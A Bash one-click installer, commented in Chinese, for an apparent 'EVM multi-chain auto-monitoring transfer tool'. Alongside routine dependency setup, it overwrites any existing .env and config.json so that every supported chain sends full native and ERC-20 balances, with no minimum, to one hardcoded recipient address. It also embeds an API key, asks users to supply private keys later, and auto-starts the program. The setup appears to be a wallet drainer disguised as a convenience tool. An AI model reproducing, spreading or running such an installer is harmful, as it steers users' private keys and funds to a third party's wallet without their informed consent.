#!/bin/bash

# EVM多链自动监控转账工具 - 一键安装脚本
# GitHub: https://github.com/haohaoi34/jiankong
# Version: 2.0 - 内置配置版本

set -e  # 遇到错误立即退出

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# 打印彩色信息
print_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# 检查操作系统
check_os() {
    print_info "检查操作系统..."
    
    if [[ "$OSTYPE" == "linux-gnu"* ]] || [[ -f /etc/os-release ]]; then
        OS="linux"
        # 尝试多种方式检测发行版
        if command -v lsb_release &> /dev/null; then
            DISTRO=$(lsb_release -si 2>/dev/null)
        elif [[ -f /etc/os-release ]]; then
            DISTRO=$(grep '^NAME=' /etc/os-release | cut -d= -f2 | tr -d '"' | cut -d' ' -f1)
        elif [[ -f /etc/redhat-release ]]; then
            DISTRO="RedHat"
        elif [[ -f /etc/debian_version ]]; then
            DISTRO="Debian"
        else
            DISTRO="Linux"
        fi
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        OS="macos"
        DISTRO="macOS"
    elif [[ "$OSTYPE" == "cygwin" ]] || [[ "$OSTYPE" == "msys" ]] || [[ "$OSTYPE" == "win32" ]]; then
        OS="windows"
        DISTRO="Windows"
    else
        # 如果无法检测，默认为Linux
        print_warning "无法检测操作系统类型: $OSTYPE，假设为Linux"
        OS="linux"
        DISTRO="Linux"
    fi
    
    print_info "检测到操作系统: $DISTRO"
}

# 检查Python版本
check_python() {
    print_info "检查Python安装..."
    
    # 检查Python 3.10+
    if command -v python3 &> /dev/null; then
        PYTHON_VERSION=$(python3 -c 'import sys; print(".".join(map(str, sys.version_info[:2])))')
        PYTHON_MAJOR=$(echo $PYTHON_VERSION | cut -d. -f1)
        PYTHON_MINOR=$(echo $PYTHON_VERSION | cut -d. -f2)
        
        if [[ $PYTHON_MAJOR -eq 3 && $PYTHON_MINOR -ge 10 ]]; then
            PYTHON_CMD="python3"
            print_success "找到Python $PYTHON_VERSION"
            return 0
        else
            print_warning "Python版本过低: $PYTHON_VERSION (需要3.10+)"
        fi
    fi
    
    # 尝试安装Python
    print_info "尝试安装Python 3.10+..."
    
    # 根据用户权限选择安装方式
    if [[ $EUID -eq 0 ]]; then
        # root用户直接安装
        SUDO_CMD=""
    else
        # 普通用户使用sudo
        SUDO_CMD="sudo"
    fi
    
    if [[ "$OS" == "linux" ]]; then
        if command -v apt-get &> /dev/null; then
            $SUDO_CMD apt-get update
            $SUDO_CMD apt-get install -y python3.10 python3.10-pip python3.10-venv
            PYTHON_CMD="python3.10"
        elif command -v yum &> /dev/null; then
            $SUDO_CMD yum install -y python3.10 python3.10-pip
            PYTHON_CMD="python3.10"
        elif command -v dnf &> /dev/null; then
            $SUDO_CMD dnf install -y python3.10 python3.10-pip
            PYTHON_CMD="python3.10"
        else
            print_error "无法自动安装Python，请手动安装Python 3.10+"
            exit 1
        fi
    elif [[ "$OS" == "macos" ]]; then
        if command -v brew &> /dev/null; then
            brew install python@3.10
            PYTHON_CMD="python3.10"
        else
            print_error "请先安装Homebrew，然后运行: brew install python@3.10"
            exit 1
        fi
    else
        print_error "请手动安装Python 3.10+: https://www.python.org/downloads/"
        exit 1
    fi
    
    print_success "Python安装完成"
}

# 检查和安装编译工具
check_build_tools() {
    print_info "检查编译工具..."
    
    # 根据用户权限选择安装方式
    if [[ $EUID -eq 0 ]]; then
        SUDO_CMD=""
    else
        SUDO_CMD="sudo"
    fi
    
    if [[ "$OS" == "linux" ]]; then
        # 检查gcc是否存在
        if ! command -v gcc &> /dev/null; then
            print_info "安装编译工具（用于编译Python包）..."
            
            if command -v apt-get &> /dev/null; then
                print_info "更新包列表..."
                $SUDO_CMD apt-get update -qq
                print_info "安装build-essential和python3-dev..."
                $SUDO_CMD apt-get install -y build-essential python3-dev python3-setuptools
                
                # 额外安装可能需要的包
                $SUDO_CMD apt-get install -y gcc g++ make libc6-dev || true
                
            elif command -v yum &> /dev/null; then
                $SUDO_CMD yum groupinstall -y "Development Tools"
                $SUDO_CMD yum install -y python3-devel python3-setuptools
                
            elif command -v dnf &> /dev/null; then
                $SUDO_CMD dnf groupinstall -y "Development Tools"
                $SUDO_CMD dnf install -y python3-devel python3-setuptools
                
            elif command -v apk &> /dev/null; then
                $SUDO_CMD apk add build-base python3-dev py3-setuptools gcc musl-dev
                
            else
                print_warning "无法自动安装编译工具，可能需要手动安装"
                print_info "请手动运行：sudo apt-get install build-essential python3-dev"
            fi
            
            # 验证安装结果
            if command -v gcc &> /dev/null; then
                print_success "编译工具安装完成"
                gcc --version | head -1
            else
                print_error "编译工具安装失败，可能影响某些包的安装"
            fi
        else
            print_success "编译工具已安装"
            gcc --version | head -1
        fi
    elif [[ "$OS" == "macos" ]]; then
        # macOS通常有Xcode命令行工具
        if ! command -v gcc &> /dev/null && ! command -v clang &> /dev/null; then
            print_warning "请安装Xcode命令行工具: xcode-select --install"
        else
            print_success "编译工具已安装"
        fi
    fi
}

# 检查pip
check_pip() {
    print_info "检查pip..."
    
    if ! $PYTHON_CMD -m pip --version &> /dev/null; then
        print_info "安装pip..."
        
        # 根据用户权限选择安装方式
        if [[ $EUID -eq 0 ]]; then
            SUDO_CMD=""
        else
            SUDO_CMD="sudo"
        fi
        
        if [[ "$OS" == "linux" ]]; then
            if command -v apt-get &> /dev/null; then
                $SUDO_CMD apt-get install -y python3-pip
            elif command -v yum &> /dev/null; then
                $SUDO_CMD yum install -y python3-pip
            elif command -v dnf &> /dev/null; then
                $SUDO_CMD dnf install -y python3-pip
            fi
        fi
        
        # 如果仍然没有pip，尝试get-pip.py
        if ! $PYTHON_CMD -m pip --version &> /dev/null; then
            print_info "下载并安装pip..."
            curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
            $PYTHON_CMD get-pip.py
            rm get-pip.py
        fi
    fi
    
    print_success "pip检查完成"
}

# 检查git
check_git() {
    print_info "检查Git..."
    
    if ! command -v git &> /dev/null; then
        print_info "安装Git..."
        
        # 根据用户权限选择安装方式
        if [[ $EUID -eq 0 ]]; then
            SUDO_CMD=""
        else
            SUDO_CMD="sudo"
        fi
        
        if [[ "$OS" == "linux" ]]; then
            if command -v apt-get &> /dev/null; then
                $SUDO_CMD apt-get install -y git
            elif command -v yum &> /dev/null; then
                $SUDO_CMD yum install -y git
            elif command -v dnf &> /dev/null; then
                $SUDO_CMD dnf install -y git
            fi
        elif [[ "$OS" == "macos" ]]; then
            if command -v brew &> /dev/null; then
                brew install git
            else
                print_error "请先安装Homebrew，然后运行: brew install git"
                exit 1
            fi
        fi
    fi
    
    print_success "Git检查完成"
}

# 克隆仓库
clone_repository() {
    print_info "克隆GitHub仓库..."
    
    REPO_URL="https://github.com/haohaoi34/jiankong.git"
    PROJECT_DIR="jiankong"
    
    # 如果目录已存在，直接覆盖（避免用户交互）
    if [[ -d "$PROJECT_DIR" ]]; then
        print_info "目录 $PROJECT_DIR 已存在，正在更新..."
        rm -rf "$PROJECT_DIR"
    fi
    
    # 克隆仓库
    if git clone "$REPO_URL" "$PROJECT_DIR"; then
        cd "$PROJECT_DIR"
        print_success "仓库克隆完成"
    else
        print_error "克隆仓库失败，请检查网络连接"
        # 如果克隆失败，尝试创建基本文件结构
        print_info "尝试创建基本项目结构..."
        mkdir -p "$PROJECT_DIR"
        cd "$PROJECT_DIR"
        
        # 从当前脚本所在位置复制文件（如果可能）
        if [[ -f "../main.py" ]]; then
            cp ../main.py .
            cp ../config.json .
            cp ../requirements.txt .
            print_success "使用本地文件创建项目"
        else
            print_error "无法获取项目文件，请检查网络连接或手动下载"
            exit 1
        fi
    fi
}

# 创建虚拟环境
create_venv() {
    print_info "创建Python虚拟环境..."
    
    if [[ -d "venv" ]]; then
        print_info "虚拟环境已存在，跳过创建"
    else
        $PYTHON_CMD -m venv venv
        print_success "虚拟环境创建完成"
    fi
    
    # 激活虚拟环境
    if [[ "$OS" == "windows" ]]; then
        source venv/Scripts/activate
    else
        source venv/bin/activate
    fi
    
    print_info "虚拟环境已激活"
}

# 智能安装依赖
install_dependencies() {
    print_info "智能检查和安装Python依赖包..."
    
    # 升级pip
    python -m pip install --upgrade pip
    
    # 升级setuptools和wheel（解决编译问题）
    python -m pip install --upgrade setuptools wheel
    
    # 创建正确的requirements.txt
    cat > requirements.txt << EOF
web3>=6.0.0,<7.0.0
aiosqlite>=0.19.0
requests>=2.28.0
python-dotenv>=1.0.0
eth-account>=0.8.0
colorama>=0.4.6
EOF
    
    # 定义依赖包列表和导入名称的映射
    declare -A packages_map=(
        ["web3"]="web3"
        ["aiosqlite"]="aiosqlite" 
        ["requests"]="requests"
        ["python-dotenv"]="dotenv"
        ["eth-account"]="eth_account"
        ["colorama"]="colorama"
    )
    
    declare -a missing_packages=()
    
    print_info "检查已安装的依赖包..."
    
    # 逐个检查依赖
    for package in "${!packages_map[@]}"; do
        import_name="${packages_map[$package]}"
        echo -n "检查 $package... "
        
        if python -c "import $import_name" 2>/dev/null; then
            print_success "✅ 已安装"
        else
            print_warning "❌ 缺失"
            missing_packages+=("$package")
        fi
    done
    
    # 只安装缺失的依赖
    if [ ${#missing_packages[@]} -gt 0 ]; then
        echo ""
        print_info "安装缺失的依赖包: ${missing_packages[*]}"
        
        for package in "${missing_packages[@]}"; do
            print_info "正在安装 $package..."
            
            # 尝试安装包
            install_success=false
            
            if [[ "$package" == "web3" ]]; then
                if python -m pip install "web3>=6.0.0,<7.0.0"; then
                    install_success=true
                fi
            elif [[ "$package" == "aiosqlite" ]]; then
                if python -m pip install "aiosqlite>=0.19.0"; then
                    install_success=true
                fi
            elif [[ "$package" == "requests" ]]; then
                if python -m pip install "requests>=2.28.0"; then
                    install_success=true
                fi
            elif [[ "$package" == "python-dotenv" ]]; then
                if python -m pip install "python-dotenv>=1.0.0"; then
                    install_success=true
                fi
            elif [[ "$package" == "eth-account" ]]; then
                # eth-account可能需要编译，使用特殊策略
                print_info "安装eth-account（可能需要编译依赖）..."
                
                # 先尝试安装可能需要的编译依赖
                if command -v apt-get &> /dev/null; then
                    python -m pip install --only-binary=lru-dict lru-dict 2>/dev/null || true
                fi
                
                # 尝试多种安装方式
                if python -m pip install "eth-account>=0.8.0" --prefer-binary --no-build-isolation; then
                    install_success=true
                elif python -m pip install "eth-account>=0.8.0" --only-binary=:all: 2>/dev/null; then
                    install_success=true
                elif python -m pip install "eth-account>=0.8.0" --no-cache-dir --prefer-binary; then
                    install_success=true
                fi
            elif [[ "$package" == "colorama" ]]; then
                if python -m pip install "colorama>=0.4.6"; then
                    install_success=true
                fi
            fi
            
            # 如果安装失败，尝试备用方案
            if [ "$install_success" = false ]; then
                print_warning "$package 安装失败，尝试备用方案..."
                
                # 备用方案1: 只使用预编译包
                if python -m pip install "$package" --only-binary=:all: --prefer-binary 2>/dev/null; then
                    install_success=true
                    print_success "$package 使用预编译包安装成功"
                # 备用方案2: 跳过有问题的依赖
                elif python -m pip install "$package" --no-deps --force-reinstall 2>/dev/null; then
                    install_success=true
                    print_success "$package 跳过依赖安装成功"
                # 备用方案3: 使用较旧版本
                elif [[ "$package" == "eth-account" ]]; then
                    if python -m pip install "eth-account==0.8.0" --prefer-binary 2>/dev/null; then
                        install_success=true
                        print_success "$package 使用较旧版本安装成功"
                    fi
                fi
            fi
            
            if [ "$install_success" = false ]; then
                print_error "$package 安装失败，正在尝试强制安装编译工具..."
                
                # 强制安装编译工具
                if [[ "$OS" == "linux" ]] && command -v apt-get &> /dev/null; then
                    print_info "强制安装编译环境..."
                    $SUDO_CMD apt-get update -qq
                    $SUDO_CMD apt-get install -y build-essential python3-dev python3-setuptools gcc g++ make
                    
                    # 再次尝试安装失败的包
                    print_info "重新尝试安装 $package..."
                    if python -m pip install "$package" --no-cache-dir --prefer-binary; then
                        print_success "$package 强制重装成功"
                        install_success=true
                    fi
                fi
                
                if [ "$install_success" = false ]; then
                    print_error "$package 最终安装失败"
                    print_info "建议手动安装：pip3 install $package --prefer-binary"
                    print_warning "继续安装其他包..."
                    # 不退出，继续安装其他包
                fi
            else
                print_success "$package 安装成功"
            fi
        done
    else
        print_success "✅ 所有依赖都已安装"
    fi
    
    # 特殊处理：检查并修复lru-dict问题
    print_info "检查lru-dict依赖..."
    if ! python -c "import lru" 2>/dev/null; then
        print_info "尝试解决lru-dict编译问题..."
        
        # 方法1: 使用预编译包
        if python -m pip install --only-binary=lru-dict lru-dict --force-reinstall 2>/dev/null; then
            print_success "lru-dict预编译包安装成功"
        # 方法2: 使用替代包
        elif python -m pip install cachetools 2>/dev/null; then
            print_success "使用cachetools作为lru-dict替代"
        else
            print_warning "lru-dict安装失败，但不影响主要功能"
        fi
    else
        print_success "lru-dict已正常安装"
    fi
    
    print_success "依赖包安装完成"
}

# 配置环境变量
configure_env() {
    print_info "配置环境变量..."
    
    # 内置的默认配置
    DEFAULT_ALCHEMY_API_KEY="MYr2ZG1P7bxc4F1qVTLIj"
    DEFAULT_RECIPIENT_ADDRESS="0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"
    
    # 检查.env文件是否存在
    if [[ -f ".env" ]]; then
        print_info ".env文件已存在，使用默认配置更新"
    fi
    
    # 创建.env文件（使用内置配置）
    cat > .env << EOF
# Alchemy API密钥 - 内置默认配置
ALCHEMY_API_KEY=$DEFAULT_ALCHEMY_API_KEY

# 私钥 - 支持混合文本输入，系统会自动提取有效私钥
# 您可以通过程序菜单或直接编辑此文件来配置私钥
PRIVATE_KEYS=

# Discord Webhook URL（可选） - 用于通知
# DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/your_webhook_url

# 默认接收地址（已内置）
DEFAULT_RECIPIENT_ADDRESS=$DEFAULT_RECIPIENT_ADDRESS
EOF
    
    print_success "环境变量配置完成"
    print_info "已使用内置API密钥: ${DEFAULT_ALCHEMY_API_KEY:0:8}..."
    print_info "已设置默认接收地址: $DEFAULT_RECIPIENT_ADDRESS"
    print_info "您可以稍后在程序中配置私钥"
}

# 创建基础项目文件（备用方案）
create_project_files() {
    print_info "创建项目文件..."
    
    # 如果main.py不存在，创建一个基础版本
    if [[ ! -f "main.py" ]]; then
        print_info "创建main.py文件..."
        cat > main.py << 'MAIN_EOF'
#!/usr/bin/env python3
"""
EVM多链自动监控转账工具 - 简化版本
"""
print("正在初始化EVM多链监控工具...")
print("请手动从GitHub下载完整版本: https://github.com/haohaoi34/jiankong")
print("此为备用版本，功能有限")
MAIN_EOF
        chmod +x main.py
    fi
    
    # 创建requirements.txt
    if [[ ! -f "requirements.txt" ]]; then
        cat > requirements.txt << 'REQ_EOF'
web3>=6.0.0,<7.0.0
aiosqlite>=0.19.0
requests>=2.28.0
python-dotenv>=1.0.0
eth-account>=0.8.0
colorama>=0.4.6
REQ_EOF
    fi
}

# 创建默认配置
create_config() {
    print_info "创建默认配置文件..."
    
    # 使用内置的默认地址
    DEFAULT_RECIPIENT_ADDRESS="0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"
    
    if [[ -f "config.json" ]]; then
        print_info "config.json已存在，更新为默认配置"
    fi
    
    cat > config.json << EOF
{
  "chains": [
    {
      "name": "ETH_MAINNET",
      "chain_id": 1,
      "recipient_address": "$DEFAULT_RECIPIENT_ADDRESS",
      "comment": "以太坊主网 - 全代币转账，无最低金额限制"
    },
    {
      "name": "POLYGON_MAINNET", 
      "chain_id": 137,
      "recipient_address": "$DEFAULT_RECIPIENT_ADDRESS",
      "comment": "Polygon主网 - 全代币转账，无最低金额限制"
    },
    {
      "name": "ARBITRUM_ONE",
      "chain_id": 42161,
      "recipient_address": "$DEFAULT_RECIPIENT_ADDRESS",
      "comment": "Arbitrum One - 全代币转账，无最低金额限制"
    },
    {
      "name": "BASE_MAINNET",
      "chain_id": 8453,
      "recipient_address": "$DEFAULT_RECIPIENT_ADDRESS",
      "comment": "Base主网 - 全代币转账，无最低金额限制"
    },
    {
      "name": "BSC_MAINNET",
      "chain_id": 56,
      "recipient_address": "$DEFAULT_RECIPIENT_ADDRESS",
      "comment": "BNB Smart Chain - 全代币转账，无最低金额限制"
    }
  ],
  "erc20": [],
  "settings": {
    "monitoring_interval": 0.1,
    "round_pause": 60,
    "gas_threshold_gwei": 50,
    "gas_wait_time": 60,
    "enable_native_tokens": true,
    "enable_erc20_tokens": true,
    "comment": "监控设置说明：monitoring_interval-查询间隔(秒)，round_pause-轮询暂停(秒)，无最低转账金额限制，支持原生代币和ERC-20代币转账"
  },
  "notifications": {
    "discord_enabled": false,
    "discord_webhook_url": "",
    "comment": "通知设置，可配置Discord通知"
  }
}
EOF
    
    print_success "默认配置文件创建完成"
    print_info "已设置所有链的默认接收地址: $DEFAULT_RECIPIENT_ADDRESS"
}

# 创建目录结构
create_directories() {
    print_info "创建必要的目录..."
    
    mkdir -p logs
    mkdir -p data
    
    print_success "目录结构创建完成"
}

# 测试安装
test_installation() {
    print_info "测试安装..."
    
    # 测试关键依赖包导入
    print_info "测试关键依赖包..."
    
    # 测试核心Python模块
    python -c "import asyncio, json, logging, os, re, sqlite3, time; print('核心模块正常')" || print_warning "核心模块导入异常"
    
    # 测试第三方依赖包
    declare -A test_packages=(
        ["aiosqlite"]="aiosqlite"
        ["requests"]="requests"
        ["web3"]="web3"
        ["eth_account"]="eth_account"
        ["dotenv"]="dotenv"
        ["colorama"]="colorama"
    )
    
    all_success=true
    for package in "${!test_packages[@]}"; do
        import_name="${test_packages[$package]}"
        if python -c "import $import_name" 2>/dev/null; then
            print_success "$package 导入正常"
        else
            print_warning "$package 导入失败，可能需要安装"
            all_success=false
        fi
    done
    
    if [ "$all_success" = true ]; then
        print_success "所有依赖包测试通过"
    else
        print_warning "部分依赖包可能未安装，程序启动时会自动处理"
    fi
    
    # 测试主程序语法
    if python -m py_compile main.py; then
        print_success "主程序语法检查通过"
    else
        print_error "主程序语法检查失败"
        exit 1
    fi
}

# 显示完成信息
show_completion() {
    echo
    print_success "=============================================="
    print_success "  EVM多链监控工具安装完成！"
    print_success "=============================================="
    echo
    print_info "安装信息："
    echo "  • 操作系统: $DISTRO"
    echo "  • Python版本: $($PYTHON_CMD --version)"
    echo "  • 用户权限: $(if [[ $EUID -eq 0 ]]; then echo "管理员(root)"; else echo "普通用户"; fi)"
    echo "  • 安装路径: $(pwd)"
    echo
    print_info "下一步操作："
    echo "  1. 配置私钥和转账设置"
    echo "  2. 启动监控程序"
    echo
    print_info "启动命令："
    if [[ "$OS" == "windows" ]]; then
        echo "  cd jiankong && venv\\Scripts\\activate && python main.py"
    else
        echo "  cd jiankong && source venv/bin/activate && python main.py"
    fi
    echo
    print_info "或者直接运行："
    echo "  cd jiankong && python main.py"
    echo
    print_info "内置配置："
    echo "  • API密钥: MYr2ZG1P7bxc4F1qVTLIj (已内置)"
    echo "  • 接收地址: 0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1 (已配置)"
    echo "  • 支持链: ETH, Polygon, Arbitrum, Base, BSC等主流链"
    echo
    print_info "重要提醒："
    echo "  • 请在交互式菜单中配置您的私钥"
    echo "  • 已内置API密钥和接收地址，可直接使用"
    echo "  • 建议先在测试网测试后再使用主网"
    echo "  • 请妥善保管您的私钥，不要泄露给他人"
    echo "  • 程序会自动屏蔽无交易历史的链以节省资源"
    echo "  • 支持所有用户权限运行，包括root用户"
    echo
    print_info "获取帮助："
    echo "  • GitHub: https://github.com/haohaoi34/jiankong"
    echo "  • 文档: 查看README.md"
    echo
}

# 启动程序
start_program() {
    echo
    print_info "正在自动启动EVM多链监控工具..."
    echo
    
    # 确保在正确的目录中
    if [[ ! -f "main.py" ]]; then
        print_error "找不到main.py文件，请检查安装"
        print_info "当前目录: $(pwd)"
        print_info "尝试进入jiankong目录..."
        if [[ -d "jiankong" ]]; then
            cd jiankong
        else
            print_error "找不到jiankong目录"
            exit 1
        fi
    fi
    
    # 激活虚拟环境（如果存在）
    if [[ -f "venv/bin/activate" ]]; then
        print_info "激活Python虚拟环境..."
        source venv/bin/activate
    elif [[ -f "venv/Scripts/activate" ]]; then
        source venv/Scripts/activate
    fi
    
    # 最终依赖检测（确保colorama等包已安装）
    print_info "最终依赖检测..."
    
    # 定义必需的依赖包
    declare -A final_packages=(
        ["aiosqlite"]="aiosqlite"
        ["web3"]="web3" 
        ["colorama"]="colorama"
        ["requests"]="requests"
        ["python-dotenv"]="dotenv"
        ["eth-account"]="eth_account"
    )
    
    declare -a final_missing=()
    
    # 检查所有依赖
    for package in "${!final_packages[@]}"; do
        import_name="${final_packages[$package]}"
        if ! python -c "import $import_name" 2>/dev/null; then
            final_missing+=("$package")
        fi
    done
    
    # 如果有缺失的包，立即安装
    if [ ${#final_missing[@]} -gt 0 ]; then
        print_warning "发现缺失的依赖包: ${final_missing[*]}"
        print_info "正在安装缺失的包..."
        
        for package in "${final_missing[@]}"; do
            print_info "安装 $package..."
            
            # 使用多种策略安装
            if python -m pip install "$package" --prefer-binary --quiet; then
                print_success "$package 安装成功"
            elif python -m pip install "$package" --only-binary=:all: --quiet 2>/dev/null; then
                print_success "$package 预编译包安装成功"
            elif python -m pip install "$package" --no-deps --quiet 2>/dev/null; then
                print_success "$package 无依赖安装成功"
            else
                print_warning "$package 安装失败，尝试继续运行"
                # 不退出，尝试继续运行程序
            fi
        done
    else
        print_success "所有依赖都已就绪"
    fi
    
    # 显示程序信息
    echo ""
    echo "=============================================="
    echo "🚀 EVM多链自动监控转账工具"
    echo "=============================================="
    echo "🎯 目标地址: 0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"
    echo "📱 Telegram通知已配置"
    echo "⚡ 优化速度: 300-500 CU/s"
    echo "🛡️ 智能Gas优化"
    echo "💾 私钥持久化存储"
    echo "🌈 彩色输出界面"
    echo "=============================================="
    echo ""
    
    # 启动程序
    print_success "启动程序中..."
    
    # 当通过 curl|bash 运行时，stdin/out/err 可能不连接到 TTY，这里重定向到 /dev/tty 以进入交互菜单
    if [[ -e /dev/tty ]]; then
        exec python main.py < /dev/tty > /dev/tty 2>&1
    else
        exec python main.py
    fi
}

# 主函数
main() {
    echo "=============================================="
    echo "  EVM多链自动监控转账工具 - 一键安装"
    echo "  GitHub: https://github.com/haohaoi34/jiankong"
    echo "=============================================="
    echo
    
    # 检查用户权限信息（仅显示，不阻止）
    if [[ $EUID -eq 0 ]]; then
        print_info "检测到root权限，正在以管理员身份运行"
    else
        print_info "检测到普通用户权限，正在以用户身份运行"
    fi
    
    # 执行安装步骤
    check_os
    check_python
    check_build_tools  # 在pip之前检查编译工具
    check_pip
    check_git
    clone_repository
    create_project_files  # 确保项目文件存在
    create_venv
    install_dependencies
    configure_env
    create_config
    create_directories
    test_installation
    show_completion
    start_program
}

# 错误处理
trap 'print_error "安装过程中发生错误，请检查输出信息"; exit 1' ERR

# 运行主函数
main "$@"
